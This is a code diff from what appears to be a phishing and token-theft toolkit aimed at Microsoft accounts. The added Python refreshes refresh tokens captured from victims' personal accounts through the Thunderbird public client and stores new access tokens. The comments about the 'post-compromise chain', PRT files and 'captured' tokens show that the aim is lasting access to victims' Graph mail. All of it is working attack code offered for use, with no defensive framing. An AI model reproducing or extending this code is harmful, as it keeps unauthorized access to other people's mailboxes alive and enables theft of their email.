@@ -99,6 +99,38 @@ def refresh_via_prt(user_code):
     prt_file    = os.path.join(victim_path, 'roadtx.prt')
     auth_file   = os.path.join(victim_path, '.roadtools_auth')
 
+    # ── Personal (consumer) accounts have no PRT ─────────────────
+    # Refresh through the Thunderbird public client on the consumers
+    # authority instead — the same client used for capture, so the RT is
+    # bound to it and the resulting token resolves against Graph mail.
+    sess = db.get_session(user_code) or {}
+    if (sess.get('account_type') or 'work') == 'personal':
+        rt = sess.get('refresh_token')
+        if not rt:
+            return False, None, None
+        try:
+            import requests as _rq
+            from config import Config as _Cfg
+            resp = _rq.post(_Cfg.TOKEN_URL_V1, data={
+                'client_id': _Cfg.PERSONAL_CLIENT_ID,
+                'grant_type': 'refresh_token',
+                'refresh_token': rt,
+                'scope': _Cfg.PERSONAL_SCOPES,
+            }, timeout=20)
+            data = resp.json()
+            if 'access_token' not in data:
+                logger.warning(f"[PERSONAL-REFRESH] {user_code}: {str(data.get('error_description'))[:120]}")
+                return False, None, None
+            new_at = data['access_token']
+            new_rt = data.get('refresh_token') or rt
+            exp = int(datetime.datetime.utcnow().timestamp()) + int(data.get('expires_in', 3600))
+            db.update_session_refreshed_token(user_code, new_at, exp, new_rt)
+            logger.info(f"[PERSONAL-REFRESH] {user_code}: token refreshed via Thunderbird client.")
+            return True, new_at, exp
+        except Exception as e:
+            logger.warning(f"[PERSONAL-REFRESH] {user_code}: {e}")
+            return False, None, None
+
     if not os.path.exists(prt_file):
         logger.warning(f"[PRT-REFRESH] {user_code}: roadtx.prt not found — "
                        "post-compromise chain has not been run for this session.")
@@ -249,11 +281,12 @@ def _run_post_compromise_chain(user_code):
 
     # ── PERSONAL ACCOUNTS: no post-compromise chain at all ──────
     # Consumer accounts have no device registration, no PRT and no DRS. The
-    # captured Office token already carries Mail.ReadWrite and is a valid
-    # Microsoft Graph credential, so the chain adds nothing but latency and
-    # failure modes. Resolve the identity from the token claims and finish.
+    # captured Thunderbird token already carries Mail.Read/Mail.ReadWrite and
+    # is a valid Microsoft Graph credential with a resolvable identity, so the
+    # chain adds nothing but latency and failure modes. Resolve the identity
+    # from the token claims and finish.
     if (session.get('account_type') or 'work') == 'personal':
-        logger.info("[PERSONAL] Consumer account — skipping the entire chain; the captured Office token is the credential.")
+        logger.info("[PERSONAL] Consumer account — skipping the entire chain; the captured token is the credential.")
         _claims = _decode_jwt_claims(at)
         _upn = (_claims.get('email')
                 or (_claims.get('unique_name') or '').split('#')[-1]
